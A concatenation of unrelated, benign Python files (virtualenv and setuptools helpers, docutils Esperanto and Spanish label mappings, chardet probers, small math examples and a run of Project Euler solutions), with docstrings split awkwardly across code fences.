    :param key: the config key requested
    :param as_type: the type we would like to convert it to
    :param env: environment variables to use
    :return:
    """
    environ_key = ensure_str("VIRTUALENV_{}".format(key.upper()))
    if env.get(environ_key):
        value = env[environ_key]
        # noinspection PyBroadException
        try:
            source = "env var {}".format(ensure_text(environ_key))
            as_type = convert(value, as_type, source)
            return as_type, source
        except Exception:  # note the converter already logs a warning when failures happen
            pass


__all__ = ("get_env_var",)

# -*- coding: utf-8 -*-
from __future__ import absolute_import, print_function

from .compat import IS_TYPE_CHECKING

MYPY_RUNNING = IS_TYPE_CHECKING

# $Id: eo.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Marcelo Huerta San Martin <richieadler@users.sourceforge.net>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Esperanto-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    # fixed: language-dependent
    "author": u"A\u016dtoro",
    "authors": u"A\u016dtoroj",
    "organization": u"Organizo",
    "address": u"Adreso",
    "contact": u"Kontakto",
    "version": u"Versio",
    "revision": u"Revido",
    "status": u"Stato",
    "date": u"Dato",
    # 'copyright': u'Kopirajto',
    "copyright": u"A\u016dtorrajto",
    "dedication": u"Dedi\u0109o",
    "abstract": u"Resumo",
    "attention": u"Atentu!",
    "caution": u"Zorgu!",
    "danger": u"DAN\u011cERO!",
    "error": u"Eraro",
    "hint": u"Spuro",
    "important": u"Grava",
    "note": u"Noto",
    "tip": u"Helpeto",
    "warning": u"Averto",
    "contents": u"Enhavo",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    # language-dependent: fixed
    "a\u016dtoro": "author",
    "a\u016dtoroj": "authors",
    "organizo": "organization",
    "adreso": "address",
    "kontakto": "contact",
    "versio": "version",
    "revido": "revision",
    "stato": "status",
    "dato": "date",
    "a\u016dtorrajto": "copyright",
    "dedi\u0109o": "dedication",
    "resumo": "abstract",
}```


```pyEsperanto (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

from nbconvert.exporters import Exporter


class DummyExporter(Exporter):
    pass


class DummyScriptExporter(Exporter):
    def from_notebook_node(self, nb, resources=None, **kw):
        return "dummy-script-exported", resources

from product import Product


class Equipment(Product):
    def __init__(self, name, price, style, weight):
        super().__init__(name, price)
        self.style = style
        self.weight = weight

# err.py
def foo(s):
    return 10 / int(s)


def bar(s):
    return foo(s) * 2


def main():
    bar("0")


main()

# err_logging.py

import logging


def foo(s):
    return 10 / int(s)


def bar(s):
    return foo(s) * 2


def main():
    try:
        bar("0")
    except Exception as e:
        logging.exception(e)


main()
print("END")

# err_raise.py
class FooError(ValueError):
    pass


def foo(s):
    n = int(s)
    if n == 0:
        raise FooError("invalid value: %s" % s)
    return 10 / n


foo("0")

# err_reraise.py


def foo(s):
    n = int(s)
    if n == 0:
        raise ValueError("invalid value: %s" % s)
    return 10 / n


def bar():
    try:
        foo("0")
    except ValueError as e:
        print("ValueError!")
        raise


bar()
````

```pyErrors"""
from __future__ import absolute_import, unicode_literals


class ProcessCallFailed(RuntimeError):
    """Failed a process call"""

    def __init__(self, code, out, err, cmd):
        super(ProcessCallFailed, self).__init__(code, out, err, cmd)
        self.code = code
        self.out = out
        self.err = err
        self.cmd = cmd
```

````pysetuptools.errors

Provides exceptions used by setuptools modules.```


```py

from distutils.errors import DistutilsError


class RemovedCommandError(DistutilsError, RuntimeError):
    """Error used for commands that have been removed in setuptools.

    Since ``setuptools`` is built on ``distutils``, simply removing a command
    from ``setuptools`` will make the behavior fall back to ``distutils``; this
    error is raised if a command exists in ``distutils`` but has been actively
    removed in ``setuptools``.
    """

# -*- coding: utf-8 -*-
# $Id: es.py 4572 2006-05-25 20:48:37Z richieadler $
# Author: Marcelo Huerta San Martín <richieadler@users.sourceforge.net>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Spanish-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    "author": u"Autor",
    "authors": u"Autores",
    "organization": u"Organizaci\u00f3n",
    "address": u"Direcci\u00f3n",
    "contact": u"Contacto",
    "version": u"Versi\u00f3n",
    "revision": u"Revisi\u00f3n",
    "status": u"Estado",
    "date": u"Fecha",
    "copyright": u"Copyright",
    "dedication": u"Dedicatoria",
    "abstract": u"Resumen",
    "attention": u"\u00a1Atenci\u00f3n!",
    "caution": u"\u00a1Precauci\u00f3n!",
    "danger": u"\u00a1PELIGRO!",
    "error": u"Error",
    "hint": u"Sugerencia",
    "important": u"Importante",
    "note": u"Nota",
    "tip": u"Consejo",
    "warning": u"Advertencia",
    "contents": u"Contenido",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    u"autor": "author",
    u"autores": "authors",
    u"organizaci\u00f3n": "organization",
    u"direcci\u00f3n": "address",
    u"contacto": "contact",
    u"versi\u00f3n": "version",
    u"revisi\u00f3n": "revision",
    u"estado": "status",
    u"fecha": "date",
    u"copyright": "copyright",
    u"dedicatoria": "dedication",
    u"resumen": "abstract",
}```


```pySpanish (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

s1 = "\x61"  # \x - 2 digits
print(s1)  # a

s2 = "\u2122"  # \u - 4 digits (8482 in hex)
print(s2)  # ™

s3 = "\U00002122"  # \U - 8 digits
print(s3)  # ™

s4 = "\N{trade mark sign}"
print(s4)  # ™
````

````py
Estimation of Pi

Write a program to compute the value of PI using a random number generator/method.


=========================================
To solve this problem we'll use the Monte Carlo simulation/method.
Generate N random points (0 <= X, Y <= 1) in the first quadrant.
Count all points that are inside the circle using the squared euclidean distance (between origin <0,0> and point <X,Y>).
The ratio between all points in the quarter circle and quarter square should be
approximately equal to the ratio between a quarter of the circle area and a quarter of the square area.
(more points = better estimation)
Equation: (((r^2)*PI)/4) / (((2*r)^2)/4) = circle_points / total_points
Solve the first part: (((r^2)*PI)/4) / (((2*r)^2)/4) = ((1^2)*PI) / ((2*1)^2) = (1*PI) / (2^2) = PI/4
Simple equation: PI / 4 = circle_points / total_points
Final form: PI = 4 * circle_points / total_points
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############

from random import random


def estimate_pi(n):
    total_points = 0
    circle_points = 0

    for i in range(n):
        # generate N random points in the first quadrant
        x, y = random(), random()

        if x * x + y * y <= 1:
            # using squared euclidean distance find the distance from (0, 0) to (x, y)
            circle_points += 1
        total_points += 1

    # this formula is a short form of this: quarter_circle_area / quarter_square_area = circle_points / total_points
    return 4 * circle_points / total_points


###########
# Testing #
###########

# Test 1
# Correct result => Doesn't give a good estimation at all (often the integer part is wrong)
print(estimate_pi(10))

# Test 2
# Correct result => Gives a good estimation to the first decimal (3.1xxx)
print(estimate_pi(10000))

# Test 3
# Correct result => Gives a good estimation to the second decimal (3.14xxx)
print(estimate_pi(10000000))

######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import EUCKRDistributionAnalysis
from .mbcssm import EUCKR_SM_MODEL


class EUCKRProber(MultiByteCharSetProber):
    def __init__(self):
        super(EUCKRProber, self).__init__()
        self.coding_sm = CodingStateMachine(EUCKR_SM_MODEL)
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return "EUC-KR"

    @property
    def language(self):
        return "Korean"

from typing import Iterable, Union

import numpy as np

Vector = Union[Iterable[float], Iterable[int], np.ndarray]
VectorOut = Union[np.float64, int, float]


def euclidean_distance(vector_1: Vector, vector_2: Vector) -> VectorOut:
    """
    Calculate the distance between the two endpoints of two vectors.
    A vector is defined as a list, tuple, or numpy 1D array.
    >>> euclidean_distance((0, 0), (2, 2))
    2.8284271247461903
    >>> euclidean_distance(np.array([0, 0, 0]), np.array([2, 2, 2]))
    3.4641016151377544
    >>> euclidean_distance(np.array([1, 2, 3, 4]), np.array([5, 6, 7, 8]))
    8.0
    >>> euclidean_distance([1, 2, 3, 4], [5, 6, 7, 8])
    8.0
    """
    return np.sqrt(np.sum((np.asarray(vector_1) - np.asarray(vector_2)) ** 2))


def euclidean_distance_no_np(vector_1: Vector, vector_2: Vector) -> VectorOut:
    """
    Calculate the distance between the two endpoints of two vectors without numpy.
    A vector is defined as a list, tuple, or numpy 1D array.
    >>> euclidean_distance_no_np((0, 0), (2, 2))
    2.8284271247461903
    >>> euclidean_distance_no_np([1, 2, 3, 4], [5, 6, 7, 8])
    8.0
    """
    return sum((v1 - v2) ** 2 for v1, v2 in zip(vector_1, vector_2)) ** (1 / 2)


if __name__ == "__main__":

    def benchmark() -> None:
        """
        Benchmarks
        """
        from timeit import timeit

        print("Without Numpy")
        print(
            timeit(
                "euclidean_distance_no_np([1, 2, 3], [4, 5, 6])",
                number=10000,
                globals=globals(),
            )
        )
        print("With Numpy")
        print(
            timeit(
                "euclidean_distance([1, 2, 3], [4, 5, 6])",
                number=10000,
                globals=globals(),
            )
        )

    benchmark()

from __future__ import print_function

# https://en.wikipedia.org/wiki/Euclidean_algorithm


def euclidean_gcd(a, b):
    while b:
        t = b
        b = a % b
        a = t
    return a


def main():
    print("GCD(3, 5) = " + str(euclidean_gcd(3, 5)))
    print("GCD(5, 3) = " + str(euclidean_gcd(5, 3)))
    print("GCD(1, 3) = " + str(euclidean_gcd(1, 3)))
    print("GCD(3, 6) = " + str(euclidean_gcd(3, 6)))
    print("GCD(6, 3) = " + str(euclidean_gcd(6, 3)))


if __name__ == "__main__":
    main()

######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import EUCTWDistributionAnalysis
from .mbcssm import EUCTW_SM_MODEL


class EUCTWProber(MultiByteCharSetProber):
    def __init__(self):
        super(EUCTWProber, self).__init__()
        self.coding_sm = CodingStateMachine(EUCTW_SM_MODEL)
        self.distribution_analyzer = EUCTWDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return "EUC-TW"

    @property
    def language(self):
        return "Taiwan"

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 1
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

If we list all the natural numbers below 10 that are multiples i
of 3 or 5, we get 3, 5, 6 and 9. The sum of these multiples is 23.

Find the sum of all the multiples of 3 or 5 below 1000.```


```py


def sum_of_multiples(n, limit):
    k = (limit - 1) // n
    return ((n + k * n) * k) // 2


def sum_multiples_of_3or5(limit):
    return (
        sum_of_multiples(3, limit)
        + sum_of_multiples(5, limit)
        - sum_of_multiples(15, limit)
    )


def test():
    assert 23 == sum_multiples_of_3or5(10)


def run():
    print(sum_multiples_of_3or5(1000))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python
````

````py
Solution to Project Euler Problem 2
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

The sum of the fibonacci numbers less than 4000000```


```py
from series import all_fibs


def even_fibs(m):
    return (f for f in all_fibs(m) if f % 2 == 0)


def test():
    assert 10 == sum(even_fibs(10))


def run():
    print(sum(even_fibs(4 * 10 ** 6)))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python
````

````py
Solution to Project Euler Problem 3
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Find the largest prime factor of the given number```


```py
from factorization import factors


TARGET = 600851475143


def largest_prime_factor(n):
    return max(factors(n))[0]


def test():
    assert 29 == largest_prime_factor(13195)


def run():
    print(largest_prime_factor(TARGET))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 4
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

A palindromic number reads the same both ways. The largest palindrome made
from the product of two 2-digit numbers is 9009 = 91 x 99.

Find the largest palindrome made from the product of two 3-digit numbers.```


```py
from palindromes import is_palindrome


def largest_palindromic_for_digits(digits, limit=None):
    top = int("9" * digits)
    bot = int("9" * (digits - 1))
    best = 0
    for a in range(top, bot, -1):
        for b in range(top, bot, -1):
            n = a * b
            if limit and n >= limit:
                continue
            if n < best:
                break
            if is_palindrome(n):
                best = n
    return best


def test():
    assert 9009 == largest_palindromic_for_digits(2)


def run():
    print(largest_palindromic_for_digits(3))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 5
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

2520 is the smallest number that can be divided by each of the numbers
from 1 to 10 without any remainder.
What is the smallest positive number that is evenly divisible by all of
the numbers from 1 to 20?```


```py
from factorization import lcm


def range_lcm(m):
    return lcm(*range(2, m + 1))


def test():
    assert 2520 == range_lcm(10)


def run():
    print(range_lcm(20))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 6
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

The sum of the squares of the first ten natural numbers is,
12 + 22 + ... + 102 = 385

The square of the sum of the first ten natural numbers is,
(1 + 2 + ... + 10)2 = 552 = 3025

Hence the difference between the sum of the squares of the first ten
natural numbers and the square of the sum is 3025 - 385 = 2640.

Find the difference between the sum of the squares of the first one
hundred natural numbers and the square of the sum.```


```py
from series import sum_of_squares, square_of_sum


def ssq_sqs_diff(m):
    return square_of_sum(m) - sum_of_squares(m)


def test():
    assert 2640 == ssq_sqs_diff(10)


def run():
    print(ssq_sqs_diff(100))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python
````

````py
Solution to Project Euler Problem 7
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

By listing the first six prime numbers: 2, 3, 5, 7, 11, and 13,
we can see that the 6th prime is 13.

What is the 10001st prime number?```


```py
from primality import nth_prime


def test():
    assert 13 == nth_prime(6)


def run():
    print(nth_prime(10001))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 8
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Find the greatest product of five consecutive digits in the 1000-digit number.```


```py
import functools
import itertools
import operator


TARGET = """
73167176531330624919225119674426574742355349194934
96983520312774506326239578318016984801869478851843
85861560789112949495459501737958331952853208805511
12540698747158523863050715693290963295227443043557
66896648950445244523161731856403098711121722383113
62229893423380308135336276614282806444486645238749
30358907296290491560440772390713810515859307960866
70172427121883998797908792274921901699720888093776
65727333001053367881220235421809751254540594752243
52584907711670556013604839586446706324415722155397
53697817977846174064955149290862569321978468622482
83972241375657056057490261407972968652414535100474
82166370484403199890008895243450658541227588666881
16427171479924442928230863465674813919123162824586
17866458359124566529476545682848912883142607690042
24219022671055626321111109370544217506941658960408
07198403850962455444362981230987879927244284909188
84580156166097919133875499200524063689912560717606
05886116467109405077541002256983155200055935729725
71636269561882670428252483600823257530420752963450```


```py

TARGET = "".join(TARGET.strip().split())


def largest_product_of(n, k):
    n = [int(c) for c in str(n)]
    return max(
        functools.reduce(operator.mul, itertools.islice(n, i, i + k), 1)
        for i in range(len(n) - k)
    )


def test():
    assert 9 == largest_product_of(TARGET, 1)
    assert 81 == largest_product_of(TARGET, 2)
    assert 5832 == largest_product_of(TARGET, 4)


def run():
    print(largest_product_of(TARGET, 13))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 9
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

A Pythagorean triplet is a set of three natural numbers, a < b < c, for which,
a^2 + b^2 = c^2

For example, 3^2 + 4^2 = 9 + 16 = 25 = 5^2.

There exists exactly one Pythagorean triplet for which a + b + c = 1000.
Find the product abc.```


```py

# Solve for b the system of equations
# a2 + b2 = c2
# a + b + c = 1000

from math import sqrt
from functools import reduce
from operator import __mul__


def pythagorean_triplet_that_sums(s):
    def solve_b(a):
        return s * (s // 2 - a) // (s - a)

    for a in range(1, s):
        b = solve_b(a)
        if b < a:
            break

        c = sqrt(a ** 2 + b ** 2)
        if c != int(c):
            continue
        c = int(c)

        #        print a, b, c, a + b + c
        if a + b + c == s:
            return (a, b, c)


def prod(q):
    return reduce(__mul__, q, 1)


def prod_of_pythagorean_triplet_that_sums(s):
    return prod(pythagorean_triplet_that_sums(s))


def test():
    assert 3 * 4 * 5 == prod_of_pythagorean_triplet_that_sums(3 + 4 + 5)


def run():
    print(prod_of_pythagorean_triplet_that_sums(1000))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 10
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

The sum of the primes below 10 is 2 + 3 + 5 + 7 = 17.

Find the sum of all the primes below two million.```


```py
from primality import all_primes


def sum_primes(up_to):
    result = 0
    for p in all_primes():
        if p > up_to:
            break
        result += p
    return result


def test():
    assert 17 == sum_primes(10)


def run():
    print(sum_primes(2 * 10 ** 6))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 12
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

The sequence of triangle numbers is generated by adding the natural numbers.
So the 7th triangle number would be 1 + 2 + 3 + 4 + 5 + 6 + 7 = 28. The first
ten terms would be:

1, 3, 6, 10, 15, 21, 28, 36, 45, 55, ...

Let us list the factors of the first seven triangle numbers:

     1: 1
     3: 1,3
     6: 1,2,3,6
    10: 1,2,5,10
    15: 1,3,5,15
    21: 1,3,7,21
    28: 1,2,4,7,14,28

We can see that 28 is the first triangle number to have over five divisors.

What is the value of the first triangle number to have over five hundred divisors?```


```py
from functools import reduce
from itertools import combinations
from factorization import factors
from series import factorial
import operator


def triangles(n):
    i = 1
    t = 1
    while n > 0:
        yield t
        i += 1
        t += i
        n -= 1


def first_triangle_with_divisors(n):
    def prod(q):
        return reduce(operator.mul, q, 1)

    for t in triangles(factorial(n)):
        f = factors(t)
        reps = [k[1] for k in f]
        count = 1
        for s in range(len(reps)):
            for c in combinations(reps, s + 1):
                count += prod(c)
        if count >= n:
            return t


def test():
    assert (1, 3, 6, 10, 15, 21, 28, 36, 45, 55) == tuple(triangles(10))
    assert 28 == first_triangle_with_divisors(5)


def run():
    print(first_triangle_with_divisors(500))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 14
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

The following iterative sequence is defined for the set of positive integers:

n → n/2 (n is even)
n → 3n + 1 (n is odd)

Using the rule above and starting with 13, we generate the following sequence:
13 → 40 → 20 → 10 → 5 → 16 → 8 → 4 → 2 → 1

It can be seen that this sequence (starting at 13 and finishing at 1) contains
10 terms. Although it has not been proved yet (Collatz Problem), it is thought
that all starting numbers finish at 1.

Which starting number, under one million, produces the longest chain?

NOTE: Once the chain starts the terms are allowed to go above one million.```


```py


__count = {1: 1}


def next_collaz(n):
    if n % 2:
        return 3 * n + 1
    else:
        return n // 2


def collaz_seq_len(n):
    if n not in __count:
        __count[n] = 1 + collaz_seq_len(next_collaz(n))
    return __count[n]


def max_collaz_seq_len(limit):
    m = 0
    n = 0
    for i in range(1, limit):
        c = collaz_seq_len(i)
        if c < m:
            continue

        m = c
        n = i
    return (n, m)


def test():
    assert 10 == collaz_seq_len(13)


def run():
    print(max_collaz_seq_len(10 ** 6))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 15
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


Starting in the top left corner of a 2×2 grid, there are 6 routes (without backtracking) to the bottom right corner.

How many routes are there through a 20×20 grid?```


```py

__seen = {}


def count_routes(n, m):
    if n == 0 or m == 0:
        return 1

    if (n, m) in __seen:
        return __seen[(n, m)]

    if n == m:
        result = 2 * count_routes(n, m - 1)
    else:
        result = count_routes(n - 1, m) + count_routes(n, m - 1)
    __seen[(n, m)] = result
    __seen[(m, n)] = result
    return result


def test():
    assert 6 == count_routes(2, 2)


def run():
    print(count_routes(20, 20))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 16
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

2^15 = 32768 and the sum of its digits is 3 + 2 + 7 + 6 + 8 = 26.

What is the sum of the digits of the number 21000?```


```py


def sum_pow2_digist(e):
    return sum(int(c) for c in str(2 ** e) if c)


def test():
    assert 26 == sum_pow2_digist(15)


def run():
    print(sum_pow2_digist(1000))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 17
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

If the numbers 1 to 5 are written out in words: one, two, three, four, five,
then there are 3 + 3 + 5 + 4 + 4 = 19 letters used in total.

If all the numbers from 1 to 1000 (one thousand) inclusive were written out in
 words, how many letters would be used?

NOTE: Do not count spaces or hyphens. For example, 342 (three hundred and
forty-two) contains 23 letters and 115 (one hundred and fifteen) contains 20
letters. The use of "and" when writing out numbers is in compliance with British
usage.```


```py
from numberwords import num2words


def num2only_letters(n):
    return "".join(c for c in num2words(n) if c.isalpha())


def sum_word_len(n):
    return sum(len(num2only_letters(i)) for i in range(1, n + 1))


def test():
    assert "five" == num2words(5)
    assert 19 == sum_word_len(5)

    assert "one hundred and fifteen" == num2words(115)
    assert 20 == len(num2only_letters(115)), len(num2only_letters(115))

    assert "three hundred and forty-two" == num2words(342)
    assert 23 == len(num2only_letters(342)), len(num2only_letters(342))


def run():
    print(sum_word_len(1000))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 18
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

By starting at the top of the triangle below and moving to adjacent numbers on
the row below, the maximum total from top to bottom is 23.

3
7 4
2 4 6
8 5 9 3

That is, 3 + 7 + 4 + 9 = 23.

Find the maximum total from top to bottom of the triangle below:```


```py
from copy import deepcopy
from graphs import build_graph_from_triangle, find_max_path


STRIANGLE = """
75
95 64
17 47 82
18 35 87 10
20 04 82 47 65
19 01 23 75 03 34
88 02 77 73 07 63 67
99 65 04 28 06 16 70 92
41 41 26 56 83 40 80 70 33
41 48 72 33 47 32 37 16 94 29
53 71 44 65 25 43 91 52 97 51 14
70 11 33 28 77 73 17 78 39 68 17 57
91 71 52 38 17 14 91 43 58 50 27 29 48
63 66 04 68 89 53 67 30 73 16 69 87 40 31
04 62 98 27 23 09 70 98 73 93 38 53 60 04 23```









---


```py

NOTE: As there are only 16384 routes, it is possible to solve this problem by trying every route. However, Problem 67, is the same challenge with a triangle containing one-hundred rows; it cannot be solved by brute force, and requires a clever method! ;o)```


```py

LINES = [s.split() for s in STRIANGLE.strip().split("\n")]
TRIANGLE = [[int(s) for s in line] for line in LINES]


def max_path_value_sweep(triangle):
    t = deepcopy(triangle)
    for i in reversed(range(len(t) - 1)):
        for j, _ in enumerate(t[i]):
            t[i][j] += max(t[i + 1][j], t[i + 1][j + 1])
    return t[0][0]


def test():
    T = [[3], [7, 4], [2, 4, 6], [8, 5, 9, 3]]
    assert 23 == max_path_value_sweep(T)


def run():
    graph, start, stop = build_graph_from_triangle(TRIANGLE)
    print(max_path_value_sweep(TRIANGLE), find_max_path(graph, start, stop)[0])


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 19
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

You are given the following information, but you may prefer to do some research
for yourself.

    1 Jan 1900 was a Monday.
    Thirty days has September,
    April, June and November.
    All the rest have thirty-one,
    Saving February alone,
    Which has twenty-eight, rain or shine.
    And on leap years, twenty-nine.
    A leap year occurs on any year evenly divisible by 4, but not on a century
    unless it is divisible by 400.

How many Sundays fell on the first of the month during the twentieth century
(1 Jan 1901 to 31 Dec 2000)?```


```py
from datetime import date


def withdates():
    return sum(
        date(y, m, 1).isoweekday() == 7
        for y in range(1901, 2000 + 1)
        for m in range(1, 12 + 1)
    )


def test():
    pass


def run():
    print(withdates())


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 20
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

n! means n × (n − 1) × ... × 3 × 2 × 1

For example, 10! = 10 × 9 × ... × 3 × 2 × 1 = 3628800,
and the sum of the digits in the number 10! is 3 + 6 + 2 + 8 + 8 + 0 + 0 = 27.

Find the sum of the digits in the number 100!```


```py
from series import factorial
from digits import digits


def sumdigits(n):
    return sum(digits(n))


def test():
    assert 27 == sumdigits(factorial(10))


def run():
    print(sumdigits(factorial(100)))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 21
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


Let d(n) be defined as the sum of proper divisors of n (numbers less than n
which divide evenly into n).
If d(a) = b and d(b) = a, where a ≠ b, then a and b are an amicable pair and
each of a and b are called amicable numbers.

For example, the proper divisors of 220 are 1, 2, 4, 5, 10, 11, 20, 22, 44, 55
and 110;
therefore d(220) = 284. The proper divisors of 284 are 1, 2, 4, 71 and 142; so
d(284) = 220.

Evaluate the sum of all the amicable numbers under 10000.```


```py
from factorization import divisors

__seen = {}


def d(n):
    if n not in __seen:
        __seen[n] = sum(divisors(n)) - n
    return __seen[n]


def amicable(n):
    s = d(n)
    return s != n and n == d(s)


def amicables(n):
    return (i for i in range(2, n) if amicable(i))


def test():
    assert [1, 2, 4, 5, 11, 10, 20, 22, 44, 55, 110, 220] == list(divisors(220))
    assert d(220) == 284 and d(284) == 220


def run():
    print(sum(amicables(10 ** 4)))


if __name__ == "__main__":
    test()
    run()

#!/usr/bin/env python```


```py
Solution to Project Euler Problem 22
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/


Using names.txt (right click and 'Save Link/Target As...'), a 46K text file
containing over five-thousand first names, begin by sorting it into alphabetical
order. Then working out the alphabetical value for each name,
multiply this value by its alphabetical position in the list to obtain
a name score.

For example, when the list is sorted into alphabetical order,
COLIN, which is worth 3 + 15 + 12 + 9 + 14 = 53, is the 938th
name in the list. So, COLIN would obtain a score of 938 × 53 = 49714.

What is the total of all the name scores in the file?```


```py
import csv
from pathlib import Path
from words import alphabetical_value

FILENAME = Path(__file__).parent / "../data/names.txt"
NAMES = sorted(next(csv.reader(open(FILENAME))))


def sum_alphabetical_values(names):
    return sum(i * alphabetical_value(s) for i, s in enumerate(names, start=1))


def test():
    name = NAMES[938 - 1]
